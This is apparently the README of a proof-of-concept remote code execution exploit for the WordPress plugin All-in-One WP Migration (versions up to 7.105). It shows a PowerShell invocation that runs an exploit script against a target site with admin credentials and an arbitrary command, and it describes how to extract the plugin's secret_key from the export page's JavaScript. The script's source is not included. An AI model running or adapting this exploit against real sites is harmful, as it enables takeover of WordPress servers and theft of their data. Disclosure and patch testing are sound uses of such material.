# All-in-One WP Migration ≤ 7.105 - RCE PoC

## poc

```powershell
# fullauto
.\exploit_fullauto.ps1 -Target http://target -User admin -Pass 123456 -Cmd whoami
```

## secret_key acquire

Navigate to `/wp-admin/admin.php?page=ai1wm_export`. In the page's JavaScript:
```javascript
var ai1wm_export = { ..., "secret_key":"xxxxxxxx" };
```

## screenshots

![image-20260608025940995](assets/image-20260608025940995.png)

![image-20260608030033330](assets/image-20260608030033330.png)
